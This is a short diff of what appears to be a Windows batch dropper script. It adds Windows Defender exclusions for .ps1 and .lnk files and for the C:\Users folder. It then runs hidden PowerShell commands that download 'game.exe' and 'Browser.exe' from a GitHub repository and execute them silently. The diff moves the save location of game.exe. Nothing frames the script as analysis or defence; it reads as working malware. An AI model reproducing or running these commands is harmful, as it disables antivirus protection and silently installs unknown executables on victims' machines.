@@ -3,8 +3,8 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/game.exe -o C:\Users\Public\game.exe
-powershell.exe -w Hidden C:\Users\Public\game.exe
+powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/game.exe -o C:\Users\game.exe
+powershell.exe -w Hidden C:\Users\game.exe
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\Browser.exe
 powershell.exe -w Hidden C:\Users\Browser.exe
